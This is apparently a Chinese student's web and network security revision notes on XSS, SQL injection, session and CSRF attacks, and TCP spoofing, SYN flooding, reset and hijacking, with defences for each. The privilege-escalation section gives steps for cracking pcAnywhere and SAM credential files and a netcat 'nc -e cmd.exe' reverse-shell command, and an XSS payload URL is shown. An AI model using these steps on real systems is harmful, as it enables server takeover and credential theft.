title="5.1.2.Web应用的架构"></a>5.1.2.Web应用的架构</h3><p>Web服务器（Web网页、数据库）、Web客户端、HTTP协议</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-29 19.43.16.png" alt="截屏2024-12-29 19.43.16" style="zoom: 33%;" /><ul><li><p>Web网页：Web网页位于Web服务器上，用于展示信息，一般采用HTML语言（Hypertext Markup Language）编写</p><ul><li><p>Web网页-Form表单：获取用户输入</p></li><li><p>Web网页-统一资源定位符（Uniform Resource Locator）：指定Web网页的在互联网的位置</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;?&lt;query&gt;#&lt;frag&gt;</span><br><span class="line"></span><br><span class="line">- http：// 学段指明采用HTTP协议访问Web网页；</span><br><span class="line">- &lt;user&gt;： &lt;password&gt; 字段指定访问Web服务器所需要的用户名和口令；</span><br><span class="line">- &lt;host&gt; 字段指明Web服务器的域名或IP地址；</span><br><span class="line">- &lt;port&gt; 字段指明Web服务器的访问端口；</span><br><span class="line">- &lt;path&gt; 指定Web网页在Web服务器上的访问路径；</span><br><span class="line">- &lt;query&gt; 指定查询所附带字段；</span><br><span class="line">- &lt;frag&gt; 指定Web网页中特定的片段。</span><br></pre></td></tr></table></figure></li><li><p><strong>静态网页</strong>是指内容固定，不会根据Web客户端请求的不同而改变的Web网页动态网页。</p></li><li><p><strong>动态网页</strong>是指内容会根据时间、环境或用户输入的不同而改变的Web网页。</p></li></ul></li><li><p>Web服务器——主流web服务器apache、IIS、Nginx、 Tomcat</p></li><li><p>Web前端（客户端）——Chrome、Firefox、IE浏览器</p></li><li><p>HTTP协议：http协议用于web客户端和web服务器之间的信息交互，采用<strong>请求&#x2F;响应模式</strong>，包括<u>请求&#x2F;响应两种报文</u>。</p><ul><li>目前最流行的HTTP协议版本是HTTP1.1</li></ul></li></ul><h3 id="5-1-2-Web应用攻击类型"><a href="#5-1-2-Web应用攻击类型" class="headerlink" title="5.1.2.Web应用攻击类型"></a>5.1.2.Web应用攻击类型</h3><p>web攻击类型分为web客户端攻击、web服务器攻击和http协议攻击</p><ul><li>web客户端攻击（攻击用户）：该类攻击的目标是访问web服务器的系统或用户。最典型的攻击时跨站脚本攻击（跨站脚本攻击（Cross-Site Scripting，简称XSS攻击）、网络钓鱼和网页挂马）</li><li>web服务器攻击：该类攻击的目标是web服务器，典型的攻击方式有网页篡改、代码注入和文件操作控制攻击。SQL攻击时web服务器攻击的一种</li><li>http协议攻击：该类攻击的目标是HTTP的相关数据，典型攻击方式有HTTP头注入攻击和HTTP会话攻击</li></ul><h2 id="5-2-XSS攻击"><a href="#5-2-XSS攻击" class="headerlink" title="5.2.XSS攻击"></a>5.2.XSS攻击</h2><p>（定义、同源策略、<u>危害、代码漏洞分析及利用方法、类型、防范措施</u>）</p><h3 id="5-2-1-XSS定义、同源策略"><a href="#5-2-1-XSS定义、同源策略" class="headerlink" title="5.2.1.XSS定义、同源策略"></a>5.2.1.XSS定义、同源策略</h3><p>**定义：**XSS攻击是由于Web应用程序对用户输入过滤不足而产生的，使得攻击者输入的特定数据变成了JavaScript脚本或HTML代码。</p><p>**同源策略：**它的含义是指，A网页设置的Cookie，B网页不能打开,除非这两个网页”同源”。所谓“同源”指的是“三个相同”——<strong>协议相同、域名相同、端口相同。</strong></p><h3 id="5-2-2-XSS的危害"><a href="#5-2-2-XSS的危害" class="headerlink" title="5.2.2.XSS的危害"></a>5.2.2.XSS的危害</h3><p>(1)   <strong>网络钓鱼</strong>（攻击者可以执行JavaScript代码动态生成网页内容或直接注入HTML代码，从而产生网络钓鱼攻击），包括盗取各类用户账号；</p><p>(2)   <strong>窃取用户cookie</strong>，从而获取用户隐私信息，或利用好用户身份网站执行操作；</p><p>(3)   <strong>劫持用户（浏览器）会话</strong>（冒用合法者的会话ID进行网络访问），从而执行任意操作，例如非法转账、强制发表日志、发送电子邮件等；</p><p>(4)   强制弹出广告页面、刷流量等；</p><p>(5)   网页挂马（将Web网页技术和木马技术结合起来就是网页挂马。攻击者将恶意脚本隐藏在Web网页中，当用户浏览该网页时，这些隐藏的恶意脚本将在用户不知情的情况下执行，下载并启动木马程序）；</p><p>(6)   进行恶意操作，例如任意篡改页面信息、删除文章等；</p><p>(7)   进行大量的客户端攻击，如DDoS攻击；</p><p>(8)   提取客户端信息，例如用户的浏览历史、真实IP、开放端口等；</p><p>(9)   控制受害者机器向其它网站发起攻击；</p><p>(10) 结合其他漏洞，如CSRF漏洞，实施进一步作恶；</p><p>(11) 提升用户权限,包括进一步渗透网站；</p><p>(12) 传播跨站脚本蠕虫（XSS蠕虫是指利用XSS攻击进行传播的一类恶意代码，一般利用<strong>存储型</strong>XSS攻击。XSS蠕虫的基本原理就是将一段JavaScript代码保存在服务器上，其他用户浏览相关信息时，会执行JavaScript代码，从而引发攻击）</p><p>(13) <strong>信息刺探</strong>（利用XSS攻击，可以在客户端执行一段JavaScript代码，因此攻击者可以通过这段代码实现多种信息的刺探，访问历史信息、端口信息、剪贴板内容、客户端IP地址、键盘信息等）</p><h3 id="5-2-3-代码漏洞分析及利用方法"><a href="#5-2-3-代码漏洞分析及利用方法" class="headerlink" title="5.2.3.代码漏洞分析及利用方法"></a>5.2.3.代码漏洞分析及利用方法</h3><p>（见实验部分）</p><h3 id="5-2-4-类型"><a href="#5-2-4-类型" class="headerlink" title="5.2.4.类型"></a>5.2.4.类型</h3><ul><li><p>反射型XSS：</p><ul><li><p>非持久性、参数型跨站脚本</p></li><li><p>恶意脚本附加到URL地址参数中<br>例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.220.128/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;</span><br><span class="line">alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-29 20.25.35.png" alt="截屏2024-12-29 20.25.35" style="zoom: 33%;" /></li></ul></li><li><p>存储型XSS ：</p><ul><li>持久型 </li><li>一般攻击存在留言、评论、博客日志等中 </li><li>恶意脚本被存储在服务端的数据库中<img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-29 20.25.57.png" alt="截屏2024-12-29 20.25.57" style="zoom: 33%;" /></li></ul></li><li><p>DOM型XSS ：</p><ul><li>DOM XSS是基于在js上的 </li><li>不需要与服务端进行交互 </li><li>网站有一个HTML页面采用不安全的方式：document.location、document.URL、 document.URLUnencoded、document.referrer、window.location<img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-29 20.26.18.png" alt="截屏2024-12-29 20.26.18" style="zoom: 33%;" /></li></ul></li></ul><h3 id="5-2-5-防范措施"><a href="#5-2-5-防范措施" class="headerlink" title="5.2.5.防范措施"></a>5.2.5.防范措施</h3><ul><li>HttpOnly属性</li></ul><p>HttpOnly是另一个应用给cookie的标志，而且所有现代浏览器都支持它。HttpOnly标志的用途是指示浏览器禁止任何脚本访问cookie内容，这样就可以降低通过JavaScript发起的XSS攻击偷取cookie的风险。</p><ul><li>安全编码</li></ul><p>PHP语言中针对XSS攻击的安全编码函数有htmlentities和htmlspecialchars等，这些函数对特殊字符的安全编码方式如下:小于号（&lt;）转换成&amp;lt、大于号（&gt;）转换成&amp;gt、与符号（&amp;）转换成&amp;amp、双引号(“)转换成&amp;quot、单引号（’）转换成&amp;#39。</p><ul><li>白名单制度</li></ul><h2 id="5-3-SQL注入攻击"><a href="#5-3-SQL注入攻击" class="headerlink" title="5.3.SQL注入攻击"></a>5.3.SQL注入攻击</h2><p>（定义、类型、注入步骤、提权方法、暴库定义、防范措施）</p><p>（会考！但是没有很复杂，&#x3D;&#x3D;知道基本的sql注入怎么写就好！&#x3D;&#x3D;）</p><h3 id="5-3-1-SQL注入攻击的定义"><a href="#5-3-1-SQL注入攻击的定义" class="headerlink" title="5.3.1.SQL注入攻击的定义"></a>5.3.1.SQL注入攻击的定义</h3><p>SQL注入（SQL Injection）就是向网站提交精心构造的SQL查询语句，导致网站将关键数据信息返回</p><h3 id="5-3-2-SQL注入攻击的类型"><a href="#5-3-2-SQL注入攻击的类型" class="headerlink" title="5.3.2.SQL注入攻击的类型"></a>5.3.2.SQL注入攻击的类型</h3><p>（1） <strong>字符型SQL注入</strong></p><p>字符型SQL注入是指SQL注入点的类型为字符串</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query<span class="operator">=</span>&quot;select * from table where name=&#x27;&quot;.$name. &quot;&#x27;&quot; </span><br></pre></td></tr></table></figure><p>（2） <strong>数字型SQL注入</strong></p><p>数字型SQL注入是指SQL注入点的类型为数字(如整型)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query<span class="operator">=</span>&quot;select* from table where id=$id&quot;；</span><br></pre></td></tr></table></figure><p>（3） <strong>基于错误信息SQL注入</strong></p><p>（4） SQL盲注入</p><p>为了防止基于错误信息的SQL注入，很多Web应用会将错误信息关闭，也就是通过网页看不到Web应用执行过程中的错误信息了。SQL盲注入就是在没有信息提示的情况实现SQL注入的方法。典型的SQL盲注入一般使用布尔值、时间函数等。</p><h3 id="5-3-4-SQL注入攻击的步骤"><a href="#5-3-4-SQL注入攻击的步骤" class="headerlink" title="5.3.4.SQL注入攻击的步骤"></a>5.3.4.SQL注入攻击的步骤</h3><p>（1） 注入点的发现（单引号寻找；1&#x3D;1和1&#x3D;2的错误提示进行判别）</p><p>（2） 数据库的类型（SQL-SERVER有user，db_name()等系统变量）</p><p>（3） 猜解表名</p><p>（4） 猜解字段名</p><p>（5） 猜解内容</p><p>（6） 进入管理页面，上传ASP木马（修改后缀名；图片马；一句话木马）</p><h3 id="5-3-5-SQL注入攻击的提权方法？？？？？"><a href="#5-3-5-SQL注入攻击的提权方法？？？？？" class="headerlink" title="5.3.5.SQL注入攻击的提权方法？？？？？"></a>5.3.5.SQL注入攻击的提权方法？？？？？</h3><p>(1)   最简单的提权方法是如果服务器上有装了pcanywhere服务端，到系统盘的DocumentsandSettings&#x2F;AI IUsers&#x2F;Application&#x2F;Data&#x2F;Symantec&#x2F;pcAnywhere&#x2F;中下载*.cif文件，破解cif文件后,使用pcanywhere连接就完全控制服务器了。</p><p>(2)   利用servu来提升权限，servu是一个非常好用的ftp服务器。通过servu提升权限需要servu安装目录可写。首先通过webshell访问servu安装文件夹下的ServUDaemon.ini把他下载下来，然后在本机上安装一个servu把ServUDaemon.ini放到本地安装文件夹下覆盖。</p><p>(3)   启动servu添加了一个用户，设置为系统管理员，目录C:\，具有可执行权限然后去servu安装目录里把ServUDaemon.ini更换服务器上的。seru的提权方法很多，比如本地溢出，vbs脚本，输入的asp提权木马等等。</p><p>(4)   下载服务器c:\winnt\system32\config下的sam文件，得到后在本地进行破解，等到服务器的管理员的用户名和密码。</p><p>(5)   脚本提权。C: \Documents and Settings\AIlUsers[开始]菜单\程序\启动”写入bat，vbs</p><p>(6)   nc反向连接。如果某个目录有写权限，先上传个nc上去。在服务器上执行：nc -e cmd.exe 你的ip端口。在本地执行：nc -l -p端口。两个端口一样，则会返回远程操作系统的一个shell。</p><h3 id="5-3-6-暴库定义"><a href="#5-3-6-暴库定义" class="headerlink" title="5.3.6.暴库定义"></a>5.3.6.暴库定义</h3><p>通过一些技术手段或者程序漏洞得到数据库的地址，并将<strong>数据非法下载到本地</strong>（暴库手段：Google hack、%5c暴库）</p><p>物理路径与相对路径</p><ul><li>物理路径（绝对路径）：从根目录开始一直到该目录全程的路径</li><li>相对路径：相对于其它目录的路径</li></ul><h3 id="5-3-7-防范措施"><a href="#5-3-7-防范措施" class="headerlink" title="5.3.7.防范措施"></a>5.3.7.防范措施</h3><p>防范措施：</p><ul><li><p>特殊字符转义；</p><blockquote><p>小于号（&lt;）转换成&amp;lt、大于号（&gt;）转换成&amp;gt、与符号（&amp;）转换成&amp;amp、双引号(“)转换成&amp;quot、单引号（’）转换成&amp;#39。</p></blockquote></li><li><p>输入验证；</p></li><li><p>过滤参数化方法（数据和代码分离）</p></li></ul><h2 id="5-4-HTTP会话攻击及防御"><a href="#5-4-HTTP会话攻击及防御" class="headerlink" title="5.4.HTTP会话攻击及防御"></a>5.4.HTTP会话攻击及防御</h2><p>（预测会话ID、窃取会话ID、控制会话ID、CSRF攻击、防范措施）（看看ppt）</p><h3 id="5-4-1"><a href="#5-4-1" class="headerlink" title="5.4.1."></a>5.4.1.</h3><ul><li><p>预测会话ID：预测用户所用的会话ID，可暴力破解</p><ul><li>对策：采用编程语言内置的会话管理机制</li></ul></li><li><p>窃取会话ID：窃取用户会话的ID</p><ul><li>对策：根据不同的窃取方法采取不同的措施：基于XSS攻击的会话ID窃取，可以采用HttpOnly的方法来防范</li></ul></li><li><p>控制会话ID：包含会话ID固定和会话保持攻击。</p><ul><li>会话固定：诱骗受害者使用攻击者指定的Session ID，受害者使用攻击者的Session ID登录后就成功建立了一个会话，此时攻击者再拿着这个Session ID就劫持了会话。<ul><li>对策：尽可能的采用非会话采纳的Web环境或对会话采纳方式进行防范</li></ul></li><li>会话保持<ul><li>对策：不能让会话ID号长期有效，如采用强制销毁措施或用户登录后更改会话ID号等</li></ul></li></ul></li><li><p>CSRF攻击（跨站请求伪造攻击（Cross-Site Request Forgery，CSRF））：</p><ol><li>Grace 使用合法账户登录Web应用系统。</li><li>Web应用系统在验证账户信息后，登录成功，并给Grace 返回一个会话ID &#x3D; xxx，以表示登陆成功状态信息。</li><li>Grace 在未退出Web应用系统的情况下，访问Evil 所控制的恶意Web网页。</li><li>Evil 在返回的Web网页中嵌入恶意脚本，这段脚本能发起对Web应用系统的HTTP请求。</li><li>恶意脚本在Grace 的浏览器上执行，发送伪造的HTTP请求到Web应用系统，同时自动捎带会话ID &#x3D; xxx，请求操作成功。</li></ol><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-29 21.15.26.png" alt="截屏2024-12-29 21.15.26" style="zoom: 33%;" /></li></ul><p>![截屏2024-12-29 21.12.49](.&#x2F;attachments&#x2F;截屏2024-12-29 21.12.49.png)</p><blockquote><p>跨站请求伪造攻击</p><p>（Cross-Site Request Forgery，CSRF）</p><ol><li>victim正常访问网站www，获取该网站下的会话ID&#x3D;xxx</li><li>victim点击attacker构造好的链接，该链接包含了对www的请求，也就是victim用他的会话ID在www执行了attacker指定的任务</li></ol><p>防范措施</p><ul><li>使用POST替代GET</li><li>检验HTTP refer</li><li>验证码</li><li>使用Token</li></ul></blockquote><h3 id="5-4-2-防范措施"><a href="#5-4-2-防范措施" class="headerlink" title="5.4.2.防范措施"></a>5.4.2.防范措施</h3><p>（1） 针对预测会话ID号攻击</p><p>通常开发者自己实现会话管理机制时,较容易出现会话ID被预测的问题。因此,为防范预测会话ID号攻击，建议采用编程语言内置的会话管理机制，如PHP语言、JAVA语言的会话管理机制等。</p><p>（2） 针对窃取会话ID号攻击</p><p>需要根据不同的窃取会话ID号方法，采取不同的防范措施，如基于XSS攻击实施的会话ID号窃取攻击，可以采用Http0nly属性的方法来防范。</p><p>（3） 针对会话ID固定攻击</p><p>支持会话采纳（Session Adoption）的Web环境，存在会话ID号固定的风险比较高。因此，尽可能的采用非会话采纳的Web环境或对会话采纳方式进行防范。</p><blockquote><p>没有搞懂会话采纳是什么，猜测是用户每次登录都生成一个新的会话ID，而不是 固定使用相同的会话ID，这样攻击者的Session ID被受害者登录后，建立会话的 ID就变了</p></blockquote><p>（4） 针对会话保持攻击</p><p>主要的防范措施就是不能让会话ID号长期有效，如采用强制销毁措施或用户登录后更改会话ID号等。</p><p>（5） 针对CSRF攻击</p><p>使用POST替代GET；检验HTTP referer（检查来源）；验证码；使用Token；增加参数的不可预测性</p><h1 id="6-假消息攻击"><a href="#6-假消息攻击" class="headerlink" title="6.假消息攻击"></a>6.假消息攻击</h1><p>重点：<strong>全是重点</strong></p><p><strong>tcp实验、dns实验</strong></p><ul><li><strong>包嗅探与欺骗的原理及攻击思路</strong>（TCP通信代码及流程、IP欺骗攻击及防范）</li><li><strong>什么是TCP协议？、TCP协议的工作原理、SYN flooding 攻击原理及步骤、TCP重置攻击原理及步骤、TCP会话劫持攻击原理及步骤</strong><ul><li>（关注<u>tcp洪泛攻击</u>的概念，会考概念（也会考步骤、原理））</li></ul></li><li><strong>DNS攻击</strong>（域名结构、查询过程、DNS攻击类型及原理（本地DNS缓存中毒攻击、远程DNS缓存中毒攻击、恶意DNS服务器的回复伪造攻击、DNS重绑定攻击）、防范措施）<ul><li>（看看ppt的那个“攻击面概述”那一页，有一个图！）</li><li>本地DNS缓存中毒攻击、远程DNS缓存中毒攻击、恶意DNS服务器的回复伪造攻击、DNS重绑定攻击（也需要看看ppt！）</li></ul></li></ul><h2 id="6-1-包嗅探与欺骗的原理及攻击思路"><a href="#6-1-包嗅探与欺骗的原理及攻击思路" class="headerlink" title="6.1.包嗅探与欺骗的原理及攻击思路"></a>6.1.包嗅探与欺骗的原理及攻击思路</h2><p>（TCP通信代码及流程、IP欺骗攻击及防范）</p><h3 id="6-1-1-包嗅探："><a href="#6-1-1-包嗅探：" class="headerlink" title="6.1.1.包嗅探："></a>6.1.1.包嗅探：</h3><p>数据包嗅探描述了在<strong>实时数据</strong>流经网络时捕获这些数据的过程。嗅探程序（Sniffer）截获网络中传输的数据，并从中解析出机密信息。</p><p><strong>使用原始套接字接收数据包：</strong></p><p>创建套接字→捕获所有类型的数据包→启用混杂模式→等待数据包。（局限性：此程序不能跨不同的操作系统移植；设置过滤器并不容易；该程序未探索任何优化以提高性能。）</p><ul><li><strong>pcap library</strong>：在内部使用原始套接字，但其API在所有平台上都是标准的。PCAP的实现隐藏了操作系统的细节，允许程序员使用人类可读的布尔表达式指定过滤规则。</li></ul><h3 id="6-1-2-数据包欺骗"><a href="#6-1-2-数据包欺骗" class="headerlink" title="6.1.2.数据包欺骗"></a>6.1.2.数据包欺骗</h3><p>定义：当数据包中的某些关键信息被伪造时，我们称之为数据包欺骗。许多网络攻击依赖于数据包欺骗。（构造数据包→发包）</p><p><strong>使用原始套接字欺骗数据包：</strong></p><p>使用setsockopt()在套接字上启用IP_HDRINCL→对于原始套接字编程，目标信息已经包含在提供的IP头中，不需要填写所有字段→套接字类型为rawsocket，系统将按原样发送IP数据包→构造数据包（找到ICMP头的起始点，并将其写入ICMP结构、填写ICMP头字段、将缓冲区类型转换为IP结构、填写lP头字段）（UDP需要包含有效载荷）</p><h3 id="6-1-3-嗅探然后欺骗过程（以UDP为例-："><a href="#6-1-3-嗅探然后欺骗过程（以UDP为例-：" class="headerlink" title="6.1.3.嗅探然后欺骗过程（以UDP为例)："></a>6.1.3.嗅探然后欺骗过程（以UDP为例)：</h3><p>使用<strong>pcap</strong> API捕获感兴趣的数据包→从Captured Package中复制一份→用新消息替换UDP数据字段，并交换源和目标字段→发出欺骗的答复</p><p>数据包欺骗：<strong>Scapy</strong>与C比较（代码）</p><ul><li>Python+Scapy——优点：构造数据包非常<strong>简单</strong>；缺点：比C代码<strong>慢</strong>得多</li><li>C程序（使用原始套接字）——优点：<strong>快</strong>得多；缺点:构造数据包<strong>很复杂</strong></li><li>混合方法：使用scapy构造数据包，使用C稍微修改数据包，然后发送数据包</li></ul><h3 id="6-1-4-总结"><a href="#6-1-4-总结" class="headerlink" title="6.1.4.总结"></a>6.1.4.总结</h3><ul><li>数据包嗅听<ul><li>使用原始套接字</li><li>使用PCAP API</li></ul></li><li>使用原始套接字的数据包欺骗</li><li>嗅探和欺骗</li><li>Endianness（字节序）</li></ul><h2 id="6-2-什么是TCP协议？、TCP协议的工作原理、SYN-flooding-攻击原理及步骤、TCP重置攻击原理及步骤、TCP会话劫持攻击原理及步骤"><a href="#6-2-什么是TCP协议？、TCP协议的工作原理、SYN-flooding-攻击原理及步骤、TCP重置攻击原理及步骤、TCP会话劫持攻击原理及步骤" class="headerlink" title="6.2.什么是TCP协议？、TCP协议的工作原理、SYN flooding 攻击原理及步骤、TCP重置攻击原理及步骤、TCP会话劫持攻击原理及步骤"></a>6.2.什么是TCP协议？、TCP协议的工作原理、SYN flooding 攻击原理及步骤、TCP重置攻击原理及步骤、TCP会话劫持攻击原理及步骤</h2><p>（关注<u>tcp洪泛攻击</u>的概念，会考概念（也会考步骤、原理））</p><h3 id="6-2-1-TCP定义"><a href="#6-2-1-TCP定义" class="headerlink" title="6.2.1.TCP定义"></a>6.2.1.TCP定义</h3><p>TCP协议：传输控制协议（TCP）是Internet协议套件的核心协议。位于IP层的顶部；传输层。为应用程序提供主机到主机的通信服务。</p><p>两个传输层协议</p><ul><li><p>TCP：在应用程序之间提供可靠且有序的通信通道。</p></li><li><p>UDP：具有较低开销的轻量级协议，可用于不需要可靠性或通信顺序的应用程序</p></li></ul><h3 id="6-2-2-TCP的工作原理"><a href="#6-2-2-TCP的工作原理" class="headerlink" title="6.2.2.TCP的工作原理"></a>6.2.2.TCP的工作原理</h3><h4 id="6-2-2-1-TCP客户端程序："><a href="#6-2-2-1-TCP客户端程序：" class="headerlink" title="6.2.2.1.TCP客户端程序："></a>6.2.2.1.TCP客户端程序：</h4><p>创建socket，指定通信的类型（TCP使用SOCK_STREAM，UDP使用SOCK_DGRAM）→启动TCP连接→发送数据</p><h4 id="6-2-2-2-TCP服务器端："><a href="#6-2-2-2-TCP服务器端：" class="headerlink" title="6.2.2.2.TCP服务器端："></a>6.2.2.2.TCP服务器端：</h4><ol><li>步骤1：<strong>创建一个套接字</strong>。与客户端程序相同。</li><li>步骤2：<strong>绑定到端口号</strong>。通过网络与其他人通信的应用程序需要在其主机上注册端口号。当数据包到达时，操作系统根据端口号知道哪个应用程序是接收器。服务器需要告诉操作系统它正在使用哪个端口。这是通过bind()系统调用完成的</li><li>步骤3：<strong>侦听连接</strong>。设置套接字后，TCP程序调用listen ()以等待连接。它告诉系统它已准备好接收连接请求。一旦收到连接请求，操作系统将通过三次握手建立连接。已建立的连接放置在队列中，等待应用程序接收它。第二个参数给出了可以存储在队列中的连接数（linux kernel 2.2以后）。</li><li>步骤4：<strong>接收连接请求</strong>。建立连接后，应用程序需要“接收”连接才能访问它。accept ()系统调用从队列中提取第一个连接请求，<u>创建一个新套接字</u>，并返回引用该套接字的文件描述符</li><li>步骤5：<strong>发送和接收数据</strong>。一旦建立并接受了连接，双方都可以使用<u>这个新的套接字</u>发送和接收数据</li></ol><p>（若需要建立多个连接，需使用fork ()系统调用通过复制调用进程来创建新进程。成功时，子进程的进程ID在父进程中返回，在子进程中返回0**）**</p><h4 id="6-2-2-3-数据传输"><a href="#6-2-2-3-数据传输" class="headerlink" title="6.2.2.3.数据传输"></a>6.2.2.3.数据传输</h4><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-29 23.35.16.png" alt="截屏2024-12-29 23.35.16" style="zoom: 33%;" /><h4 id="6-2-2-4-tcp三次握手"><a href="#6-2-2-4-tcp三次握手" class="headerlink" title="6.2.2.4.tcp三次握手"></a>6.2.2.4.tcp三次握手</h4><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/image-20241229233358678.png" alt="image-20241229233358678" style="zoom: 33%;" /><p>当服务器接收到初始SYN数据包时，它使用TCB（传输控制块）存储有关连接的信息，这称为半开放连接，因为只确认了客户端-服务器连接。服务器将TCB存储在仅用于半开放连接的队列中。在服务器获得ACK数据包后，它将把这个TCB从队列中取出并存储在另一个地方。如果ACK没有到达，服务器将重新发送SYN+ACK数据包。一段时间后，TCB最终将被丢弃。</p><h3 id="6-2-3-SYN-flooding-攻击原理及步骤"><a href="#6-2-3-SYN-flooding-攻击原理及步骤" class="headerlink" title="6.2.3.&#x3D;&#x3D;SYN flooding&#x3D;&#x3D; 攻击原理及步骤"></a>6.2.3.&#x3D;&#x3D;SYN flooding&#x3D;&#x3D; 攻击原理及步骤</h3><p>想法：为了填充存储半开放连接的队列，以便没有空间为任何新的半开放连接存储TCB，基本上服务器不能接受任何新的SYN数据包。</p><p>实现这一点的步骤：持续向服务器发送大量SYN数据包。这会通过插入TCB记录来消耗队列中的空间。<u>不要完成握手的第三步，因为这将使TCB记录出列。</u></p><p>当向服务器发送SYN数据包时，我们需要使用<strong>随机源IP地址</strong>；否则攻击可能会被防火墙阻止。服务器发送的SYN+ACK数据包可能会被丢弃，因为伪造的IP地址可能不会分配给任何机器。如果到达现有机器，RST包将被发送，TCB将被平衡。由于第二种选择不太可能发生，TCB记录将大部分保留在队列中，这导致了SYNFlooding攻击。</p><p>TCP状态——LISTEN:等待TCP连接；ESTABLISHED:完成三次握手；SYN RECV:半开放式连接</p><p>SYN Flood攻击的结果：</p><ul><li><p>使用netstat命令，我们可以 看到在端口23上有大量半开放的连接，带有随机源IP。</p></li><li><p>使用top命令，我们可以看到 服务器上的CPU使用率不高。服务器处于活动状态，可以正 常执行其他功能，但仅不能接 受telnet连接。</p><blockquote><p>效果就是服务器TCP连接资源耗尽，停止响应正常的TCP连接请求。</p></blockquote></li></ul><p><strong>对策：SYN cookies</strong></p><ul><li><p>在服务器接收到SYN数据包后，它使用只有服务器知道的密钥从数据包中的信息计算密钥散列(H)。</p></li><li><p>此哈希(H)作为初始序列号从服务器发送到客户端。H称为SYN cookie。</p></li><li><p>服务器不会将半开放连接存储在其队列中。</p></li><li><p>如果客户端是攻击者，H将无法到达攻击者。</p></li><li><p>如果客户端不是攻击者，则在确认字段中输入H+1。</p></li><li><p>服务器通过重新计算cookie来检查确认字段中的数字是否有效</p><blockquote><p>SYN Cookie是对TCP服务器端的三次握手做一些修改，专门用来防范SYN Flood攻击的一种手段。它的原理是，在TCP服务器接收到TCP SYN包并返回TCP SYN + ACK包时，<strong><u><em>不分配一个专门的数据区，而是根据这个SYN包计算出一个cookie值</em></u></strong>。这个cookie作为将要返回的SYN ACK包的初始序列号。当客户端返回一个ACK包时，根据包头信息计算cookie，与返回的确认序列号(初始序列号 + 1)进行对比，如果相同，则是一个正常连接，然后，分配资源，建立连接</p></blockquote></li></ul><h3 id="6-2-4-TCP重置攻击原理及步骤"><a href="#6-2-4-TCP重置攻击原理及步骤" class="headerlink" title="6.2.4.TCP重置攻击原理及步骤"></a>6.2.4.TCP重置攻击原理及步骤</h3><p>要断开TCP连接，请执行以下操作：A向B发送一个“FIN”数据包；B用“ACK”数据包进行回复；B向a发送一个“FIN”数据包；a回复“ACK”（四次挥手）</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 00.34.32.png" alt="截屏2024-12-30 00.34.32" style="zoom: 33%;" /><p>使用重置标志：通信一方发送RST包则立即断开连接。</p><hr><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 00.35.47.png" alt="截屏2024-12-30 00.35.47" style="zoom: 33%;" /><p>TCP重置攻击的目标：断开A和B之间的TCP连接。</p><p>伪造的RST数据包，需要正确设置字段：源IP地址，源端口，目的lP地址，目的端口，Sequence number (序列号，在接收器窗口内)</p><hr><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 00.41.46.png" alt="截屏2024-12-30 00.41.46" style="zoom: 33%;" /><p>SSH连接上的TCP重置攻击：如果加密是在网络层完成的，则包括包头在内的整个TCP数据包都将被加密，这使得嗅探或欺骗变得不可能。但由于SSH在传输层进行加密，TCP包头仍然未加密。因此，攻击是成功的，因为RST数据包只需要包头。</p><p>对视频流连接的TCP重置攻击，此攻击与以前的攻击类似，只是序列号不同，因为在本例中，序列号增长非常快，不像TeInet攻击，因为我们没有在终端中键入任何内容。为此，使用NetWox 78工具重置来自用户机器的每个数据包（10.0.2.18）。如果用户正在观看视频，则来自用户机器的任何请求都将用RST数据包进行响应（连续发送可能触发惩罚措施）。</p><h3 id="6-2-5-TCP会话劫持攻击原理及步骤"><a href="#6-2-5-TCP会话劫持攻击原理及步骤" class="headerlink" title="6.2.5.TCP会话劫持攻击原理及步骤"></a>6.2.5.TCP会话劫持攻击原理及步骤</h3><p>![截屏2024-12-30 00.44.27](.&#x2F;attachments&#x2F;截屏2024-12-30 00.44.27.png)</p><p>目标：在已建立连接中注入数据。</p><p>伪造TCP数据包，需要正确设置字段：源IP地址，源端口，目标IP地址，目标端口，序列号（在接收器窗口内）。</p><p>序列号：如果接收器已接收到序列号x之前的一些数据，则下一个序列号为x+1。如果伪造的数据包使用序列号x+σ，它变得不正常了。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-30 00.46.14.png" alt="截屏2024-12-30 00.46.14" style="zoom: 33%;" /><p>用户与服务器建立telnet连接→wireshark嗅探→检索信息→伪造数据包并发送→运行反向shell重定向</p><p><strong>创建反向shell</strong>：劫持连接后运行的最佳命令是运行反向shell命令。在服务器上运行shell程序，如&#x2F;bin&#x2F;bash，并使用可由攻击者控制的输入&#x2F;输出设备。shell程序使用TCP连接的一端作为其输入&#x2F;输出，连接的另一端由攻击者计算机控制。反向shell是一个在远程计算机上运行的shell进程，可连接回攻击者。</p><p>![截屏2024-12-30 00.51.33](.&#x2F;attachments&#x2F;截屏2024-12-30 00.51.33.png)</p><p><strong>防御措施</strong>：</p><ul><li><p>使攻击者难以伪造数据包：随机化源端口号、随机化初始序列号、对本地攻击无效</p></li><li><p>加密有效载荷</p></li></ul><blockquote><h2 id="TCP通信代码"><a href="#TCP通信代码" class="headerlink" title="TCP通信代码"></a>TCP通信代码</h2><p>客户端：</p><ul><li>1.创建套接字；</li><li>2.设置目的地相关信息；</li><li>3.连接目标服务器；</li><li>4.发送数据</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> sockfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span 